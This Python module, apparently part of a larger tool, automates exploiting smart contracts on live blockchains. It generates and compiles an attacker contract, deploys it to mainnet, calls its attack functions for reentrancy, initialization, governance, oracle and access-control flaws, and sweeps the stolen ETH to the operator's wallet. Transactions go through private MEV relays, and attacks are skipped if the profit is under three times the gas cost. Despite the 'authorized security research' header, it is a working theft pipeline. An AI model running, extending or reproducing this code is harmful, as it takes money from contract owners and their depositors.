r"""T3-3 Autonomous Exploit Executor

Full pipeline: PoC generation -> Fork validation -> Compile -> Deploy -> Execute -> Sweep
For authorized security research only.
"""
import json
import os
from datetime import datetime, timezone
from typing import Optional
from web3 import Web3
from eth_account import Account
from eth_abi import encode

from .config import CHAINS, ETH_PRICE_USD, WALLET_PRIVATE_KEY, POC_DIR
from .db import Database
from .poc_generator import PoCGenerator
from .fork_validator import ForkValidator
from .mev import MEVProtection


# ── ERC20 ABI fragments ───────────────────────────────────────────────────

ERC20_ABI = json.dumps([
    {"constant": True, "inputs": [], "name": "totalSupply",
     "outputs": [{"name": "", "type": "uint256"}], "type": "function"},
    {"constant": True, "inputs": [{"name": "account", "type": "address"}],
     "name": "balanceOf",
     "outputs": [{"name": "", "type": "uint256"}], "type": "function"},
    {"constant": False, "inputs": [{"name": "to", "type": "address"},
     {"name": "amount", "type": "uint256"}], "name": "transfer",
     "outputs": [{"name": "", "type": "bool"}], "type": "function"},
    {"constant": False, "inputs": [{"name": "spender", "type": "address"},
     {"name": "amount", "type": "uint256"}], "name": "approve",
     "outputs": [{"name": "", "type": "bool"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "decimals",
     "outputs": [{"name": "", "type": "uint8"}], "type": "function"},
    {"constant": True, "inputs": [{"name": "owner", "type": "address"},
     {"name": "spender", "type": "address"}], "name": "allowance",
     "outputs": [{"name": "", "type": "uint256"}], "type": "function"},
])

# ── Flash Loan Provider ABIs ──────────────────────────────────────────────

AAVE_POOL_ABI = json.dumps([
    {"inputs": [
        {"internalType": "address", "name": "receiverAddress", "type": "address"},
        {"internalType": "address", "name": "asset", "type": "address"},
        {"internalType": "uint256", "name": "amount", "type": "uint256"},
        {"internalType": "bytes", "name": "params", "type": "bytes"},
        {"internalType": "uint16", "name": "referralCode", "type": "uint16"}
    ], "name": "flashLoanSimple", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
])

BALANCER_VAULT_ABI = json.dumps([
    {"inputs": [
        {"internalType": "contract IFlashLoanRecipient", "name": "recipient", "type": "address"},
        {"internalType": "contract IERC20[]", "name": "tokens", "type": "address[]"},
        {"internalType": "uint256[]", "name": "amounts", "type": "uint256[]"},
        {"internalType": "bytes", "name": "userData", "type": "bytes"}
    ], "name": "flashLoan", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
])


class ExploitExecutor:
    """Full exploit execution pipeline.

    1. Generate PoC (Solidity attacker contract)
    2. Compile with solc
    3. Fork validate (zero cost)
    4. Deploy attacker contract
    5. Execute exploit
    6. Sweep profits
    """

    def __init__(self, db: Database = None):
        self.db = db
        self._wallets = {}
        self._w3_cache = {}
        self.poc_gen = PoCGenerator()
        self.fork_val = ForkValidator()
        self.mev = MEVProtection()

    def _get_wallet(self, chain_id: int) -> Account:
        if chain_id not in self._wallets:
            if not WALLET_PRIVATE_KEY:
                raise ValueError('WALLET_PRIVATE_KEY not set in .env')
            self._wallets[chain_id] = Account.from_key(WALLET_PRIVATE_KEY)
        return self._wallets[chain_id]

    def _get_w3(self, chain_id: int) -> Web3:
        if chain_id not in self._w3_cache:
            chain = CHAINS.get(chain_id)
            if not chain:
                raise ValueError(f'Unsupported chain: {chain_id}')
            w3 = Web3(Web3.HTTPProvider(
                chain['rpc'], request_kwargs={'timeout': 30}
            ))
            if not w3.is_connected():
                raise ConnectionError(
                    f'Cannot connect to {chain["name"]} RPC'
                )
            self._w3_cache[chain_id] = w3
        return self._w3_cache[chain_id]

    def get_wallet_address(self, chain_id=None) -> str:
        return self._get_wallet(chain_id or 1).address

    def get_balance(self, chain_id: int) -> float:
        w3 = self._get_w3(chain_id)
        wallet = self._get_wallet(chain_id)
        bal = w3.eth.get_balance(wallet.address)
        return float(w3.from_wei(bal, 'ether'))

    # ── FULL EXPLOIT PIPELINE ──────────────────────────────────────────────

    def run_full_pipeline(self, finding: dict, chain_id: int,
                            target_address: str,
                            prober_data: dict = None) -> dict:
        """Execute the full exploit pipeline for a finding.

        Returns dict with all pipeline results.
        """
        pipeline_result = {
            'finding_title': finding.get('title', ''),
            'category': finding.get('category', ''),
            'target': target_address,
            'chain_id': chain_id,
            'steps': {},
            'final_profit_eth': 0,
            'final_profit_usd': 0,
            'exploit_successful': False,
        }

        print(f'\n{"="*60}')
        print(f'  EXPLOIT PIPELINE: {finding.get("title", "")}')
        print(f'  Target: {target_address} on {CHAINS.get(chain_id, {}).get("name", "?")}')
        print(f'{"="*60}')

        # Step 1: Generate PoC
        print(f'\n[STEP 1] Generating PoC...')
        poc = self.poc_gen.generate_poc(finding, chain_id, target_address, prober_data)
        if not poc:
            pipeline_result['steps']['poc_gen'] = {'success': False, 'error': 'Generation failed'}
            return pipeline_result
        pipeline_result['steps']['poc_gen'] = {'success': True, 'files': poc}
        print(f'  Generated: {poc["sol_path"]}')

        # Step 2: Compile
        print(f'\n[STEP 2] Compiling...')
        compiled = self.poc_gen.compile_poc(poc['sol_path'], poc['contract_name'])
        if not compiled:
            pipeline_result['steps']['compile'] = {'success': False, 'error': 'Compilation failed'}
            return pipeline_result
        pipeline_result['steps']['compile'] = {
            'success': True,
            'bytecode_size': len(compiled['bytecode']),
            'solc_version': compiled['solc_version'],
        }
        print(f'  Compiled: {len(compiled["bytecode"])} bytes')

        # Step 3: Fork validation
        print(f'\n[STEP 3] Fork validation...')
        validation = self.fork_val.validate(
            chain_id=chain_id,
            finding=finding,
            attacker_bytecode=compiled['bytecode'],
            attacker_abi=compiled['abi'],
        )
        pipeline_result['steps']['fork_validation'] = validation.to_dict()

        if not validation.success:
            print(f'  Fork validation FAILED: {validation.error}')
            print(f'  Method: {validation.method}')
            # Don't proceed if fork validation fails
            if validation.method in ('tenderly', 'hardhat_fork'):
                print(f'  ABORTING: Exploit does not work on fork')
                return pipeline_result
            # If only dry-run, we can still proceed (it just means gas estimation worked)
            print(f'  Proceeding with caution (dry-run only)')
        else:
            print(f'  Fork validation PASSED ({validation.method})')
            if validation.profit_eth > 0:
                print(f'  Estimated profit: {validation.profit_eth:.6f} ETH '
                      f'(${validation.profit_usd:,.2f})')

        # Step 4: Check wallet balance for gas + profitability
        print(f'\n[STEP 4] Checking wallet + profitability...')
        try:
            balance = self.get_balance(chain_id)
            chain = CHAINS.get(chain_id, {})
            deploy_gas = validation.gas_used or 500000
            gas_price = chain.get('gas_price_gwei', 10)
            total_gas_cost = (deploy_gas * 2 + 500000) * gas_price / 1e9
            total_gas_usd = total_gas_cost * ETH_PRICE_USD

            print(f'  Balance: {balance:.6f} ETH')
            print(f'  Estimated gas cost: {total_gas_cost:.6f} ETH (${total_gas_usd:.4f})')

            # Profitability gate: don't execute if estimated profit < 3x gas
            min_profit_eth = total_gas_cost * 3
            if validation.profit_eth > 0 and validation.profit_eth < min_profit_eth:
                print(f'  SKIP: Est. profit {validation.profit_eth:.6f} ETH < 3x gas {min_profit_eth:.6f} ETH')
                pipeline_result['steps']['wallet_check'] = {
                    'success': False,
                    'reason': 'profit_below_3x_gas',
                    'est_profit': validation.profit_eth,
                    'min_profit': min_profit_eth,
                }
                return pipeline_result

            if balance < total_gas_cost * 1.5:
                print(f'  WARNING: Low balance, may not cover gas')
                pipeline_result['steps']['wallet_check'] = {
                    'success': False,
                    'balance': balance,
                    'required': total_gas_cost,
                }
                return pipeline_result
        except Exception as e:
            print(f'  Wallet check failed: {e}')
            pipeline_result['steps']['wallet_check'] = {'success': False, 'error': str(e)}
            return pipeline_result

        # Step 5: Deploy attacker contract
        print(f'\n[STEP 5] Deploying attacker contract...')
        deploy_result = self._deploy_attacker(
            chain_id, compiled['bytecode'], compiled['abi'],
            target_address, finding
        )
        pipeline_result['steps']['deploy'] = deploy_result

        if not deploy_result.get('success'):
            print(f'  Deployment FAILED: {deploy_result.get("error", "")}')
            return pipeline_result

        attacker_addr = deploy_result['address']
        print(f'  Deployed: {attacker_addr}')
        print(f'  Gas: {deploy_result.get("gas_used", 0):,}')

        # Step 6: Execute exploit
        print(f'\n[STEP 6] Executing exploit...')
        exec_result = self._execute_attack(
            chain_id, attacker_addr, compiled['abi'],
            target_address, finding
        )
        pipeline_result['steps']['execute'] = exec_result

        if exec_result.get('success'):
            print(f'  EXPLOIT SUCCESSFUL!')
            if exec_result.get('tx_hash'):
                chain = CHAINS.get(chain_id, {})
                explorer = chain.get('explorer_url', '')
                print(f'  TX: {explorer}/tx/{exec_result["tx_hash"]}')

            # Step 7: Sweep profits
            print(f'\n[STEP 7] Sweeping profits...')
            sweep_result = self._sweep_profits(
                chain_id, attacker_addr, compiled['abi']
            )
            pipeline_result['steps']['sweep'] = sweep_result

            profit_eth = sweep_result.get('profit_eth', 0)
            profit_usd = profit_eth * ETH_PRICE_USD
            pipeline_result['final_profit_eth'] = profit_eth
            pipeline_result['final_profit_usd'] = profit_usd
            pipeline_result['exploit_successful'] = True

            print(f'  Profit: {profit_eth:.6f} ETH (${profit_usd:,.2f})')
        else:
            print(f'  EXPLOIT FAILED: {exec_result.get("error", "")}')

        # Log to DB
        if self.db:
            self.db.log_execution(
                contract_address=target_address,
                chain_id=chain_id,
                action='full_pipeline',
                tx_hash=exec_result.get('tx_hash', ''),
                gas_used=deploy_result.get('gas_used', 0) + exec_result.get('gas_used', 0),
                gas_cost_eth=deploy_result.get('gas_cost_eth', 0) + exec_result.get('gas_cost_eth', 0),
                profit_eth=pipeline_result['final_profit_eth'],
                profit_usd=pipeline_result['final_profit_usd'],
                success=pipeline_result['exploit_successful'],
                error=exec_result.get('error', ''),
                finding_id=finding.get('raw_data', {}).get('db_finding_id', 0),
                metadata={
                    'pipeline': pipeline_result['steps'],
                    'poc_files': poc,
                    'finding_title': finding.get('title', ''),
                },
            )

        return pipeline_result

    def _deploy_attacker(self, chain_id, bytecode, abi, target_address, finding):
        """Deploy the attacker contract to mainnet."""
        w3 = self._get_w3(chain_id)
        wallet = self._get_wallet(chain_id)
        chain = CHAINS[chain_id]

        # Build constructor args based on vulnerability type
        category = finding.get('category', '')
        if 'Reentrancy' in category:
            ctor_args = [Web3.to_checksum_address(target_address)]
        elif 'Initialization' in category:
            ctor_args = [Web3.to_checksum_address(target_address)]
        elif 'Selfdestruct' in category:
            ctor_args = [Web3.to_checksum_address(target_address)]
        elif 'Governance' in category:
            ctor_args = [
                Web3.to_checksum_address(target_address),
                Web3.to_checksum_address(target_address),
            ]
        elif 'Oracle' in category:
            # Need token addresses - use target as placeholder
            ctor_args = [
                Web3.to_checksum_address(target_address),
                Web3.to_checksum_address(target_address),
                Web3.to_checksum_address(target_address),
                Web3.to_checksum_address(target_address),
                chain.get('flash_loan_providers', [{}])[0].get(
                    'pool', chain.get('flash_loan_providers', [{}])[0].get(
                        'router', '0x' + '00' * 20
                    )
                ),
            ]
        else:  # Access Control, default
            ctor_args = [Web3.to_checksum_address(target_address)]

        # Encode constructor
        ctor_data = b''
        if ctor_args:
            try:
                ctor_types = ['address'] * len(ctor_args)
                ctor_data = encode(ctor_types, ctor_args)
            except Exception:
                pass

        deploy_data = bytecode
        if ctor_data:
            deploy_data += ctor_data.hex()

        # Get nonce
        nonce = w3.eth.get_transaction_count(wallet.address)
        gas_price = w3.eth.gas_price

        tx = {
            'from': wallet.address,
            'data': '0x' + deploy_data if not deploy_data.startswith('0x') else deploy_data,
            'gas': 3000000,
            'gasPrice': gas_price,
            'nonce': nonce,
            'chainId': chain_id,
        }

        # Estimate gas
        try:
            tx['gas'] = w3.eth.estimate_gas(tx) + 100000  # buffer
        except Exception as e:
            print(f'  Gas estimation failed, using default: {e}')
            tx['gas'] = 3000000

        # Sign and send via MEV protection
        try:
            mev_result = self.mev.send_private_tx(chain_id, tx)
            if not mev_result['success']:
                return {'success': False, 'error': f'MEV send failed: {mev_result["error"]}'}

            tx_hash_str = mev_result['tx_hash']
            print(f'  Deploy TX: {tx_hash_str} (via {mev_result["method"]})')

            tx_hash = bytes.fromhex(tx_hash_str.replace('0x', ''))
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=180)
            success = receipt.status == 1

            if success:
                attacker_address = receipt['contractAddress']
                gas_cost = float(receipt['gasUsed'] * receipt['gasPrice'] / 1e18)
                print(f'  Contract: {attacker_address}')
                return {
                    'success': True,
                    'address': attacker_address,
                    'tx_hash': tx_hash.hex(),
                    'gas_used': receipt['gasUsed'],
                    'gas_cost_eth': gas_cost,
                }
            else:
                return {
                    'success': False,
                    'tx_hash': tx_hash.hex(),
                    'error': f'Deployment reverted (status={receipt.status})',
                }
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _execute_attack(self, chain_id, attacker_address, abi,
                         target_address, finding):
        """Execute the exploit by calling the attacker contract."""
        w3 = self._get_w3(chain_id)
        wallet = self._get_wallet(chain_id)

        category = finding.get('category', '')
        attacker = w3.eth.contract(
            address=Web3.to_checksum_address(attacker_address),
            abi=json.loads(abi) if isinstance(abi, str) else abi,
        )

        # Choose attack function based on vulnerability type
        try:
            if 'Reentrancy' in category:
                # Need to determine the token to use
                func = attacker.functions.attack(
                    Web3.to_checksum_address(target_address),
                    1000000,  # amount - would need to be calculated
                )
            elif 'Initialization' in category:
                func = attacker.functions.exploit()
            elif 'Governance' in category:
                func = attacker.functions.createProposal()
            elif 'Oracle' in category or 'Flash' in category:
                func = attacker.functions.attack(1000000)
            else:
                # Access Control: try the convenience functions
                if hasattr(attacker.functions, 'exploitWithdraw'):
                    func = attacker.functions.exploitWithdraw()
                elif hasattr(attacker.functions, 'exploitInitialize'):
                    func = attacker.functions.exploitInitialize()
                elif hasattr(attacker.functions, 'exploitOwnership'):
                    func = attacker.functions.exploitOwnership()
                elif hasattr(attacker.functions, 'exploit'):
                    func = attacker.functions.exploit()
                else:
                    # Generic: call execute() with calldata
                    return {
                        'success': False,
                        'error': 'No suitable attack function found',
                    }

            nonce = w3.eth.get_transaction_count(wallet.address)
            tx = func.build_transaction({
                'from': wallet.address,
                'gas': 5000000,
                'gasPrice': w3.eth.gas_price,
                'nonce': nonce,
                'chainId': chain_id,
            })

            # Try gas estimation first (safety check)
            try:
                est = w3.eth.estimate_gas(tx)
                tx['gas'] = est + 50000
            except Exception as e:
                print(f'  Execute gas estimate failed: {e}')
                return {
                    'success': False,
                    'error': f'Gas estimation failed: {e}',
                }

            # Send attack via MEV protection
            mev_result = self.mev.send_private_tx(chain_id, tx)
            if not mev_result['success']:
                return {'success': False, 'error': f'MEV send failed: {mev_result["error"]}'}

            tx_hash_str = mev_result['tx_hash']
            print(f'  Attack TX: {tx_hash_str} (via {mev_result["method"]})')

            tx_hash = bytes.fromhex(tx_hash_str.replace('0x', ''))
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=180)
            success = receipt.status == 1

            return {
                'success': success,
                'tx_hash': tx_hash.hex(),
                'gas_used': receipt['gasUsed'],
                'gas_cost_eth': float(
                    receipt['gasUsed'] * receipt['gasPrice'] / 1e18
                ),
                'error': '' if success else 'Transaction reverted',
            }

        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _sweep_profits(self, chain_id, attacker_address, abi):
        """Sweep all profits from attacker contract back to wallet."""
        w3 = self._get_w3(chain_id)
        wallet = self._get_wallet(chain_id)
        attacker = w3.eth.contract(
            address=Web3.to_checksum_address(attacker_address),
            abi=json.loads(abi) if isinstance(abi, str) else abi,
        )

        total_profit_eth = 0

        # Sweep ETH
        try:
            if hasattr(attacker.functions, 'sweepETH'):
                bal_before = w3.eth.get_balance(wallet.address)
                func = attacker.functions.sweepETH()
                tx = func.build_transaction({
                    'from': wallet.address,
                    'gas': 100000,
                    'gasPrice': w3.eth.gas_price,
                    'nonce': w3.eth.get_transaction_count(wallet.address),
                    'chainId': chain_id,
                })
                signed = wallet.sign_transaction(tx)
                tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
                receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=60)
                bal_after = w3.eth.get_balance(wallet.address)
                if receipt.status == 1:
                    total_profit_eth += float(w3.from_wei(bal_after - bal_before, 'ether'))
                    print(f'  Swept {w3.from_wei(bal_after - bal_before, "ether")} ETH')
        except Exception as e:
            print(f'  ETH sweep: {e}')

        # Check attacker contract balance for any remaining ETH
        try:
            remaining = w3.eth.get_balance(
                Web3.to_checksum_address(attacker_address)
            )
            if remaining > 0:
                print(f'  WARNING: {w3.from_wei(remaining, "ether")} ETH '
                      f'remaining in attacker contract')
        except Exception:
            pass

        return {'profit_eth': total_profit_eth}

    # ── LEGACY / SIMPLE METHODS ────────────────────────────────────────────

    def execute_exploit(self, chain_id, target_address, attacker_address,
                         attack_data, value=0):
        """Execute a pre-deployed attacker contract (legacy method)."""
        w3 = self._get_w3(chain_id)
        wallet = self._get_wallet(chain_id)
        tx = {
            'from': wallet.address,
            'to': Web3.to_checksum_address(attacker_address),
            'data': attack_data, 'value': value, 'gas': 5000000,
            'gasPrice': w3.eth.gas_price,
            'nonce': w3.eth.get_transaction_count(wallet.address),
            'chainId': chain_id,
        }
        try:
            w3.eth.estimate_gas(tx)
        except Exception as e:
            return {'success': False, 'error': f'Dry run failed: {e}'}
        signed = wallet.sign_transaction(tx)
        try:
            tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
            success = receipt.status == 1
            return {
                'success': success, 'tx_hash': tx_hash.hex(),
                'gas_used': receipt['gasUsed'],
                'gas_cost_eth': float(
                    receipt['gasUsed'] * receipt['gasPrice'] / 1e18
                ),
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
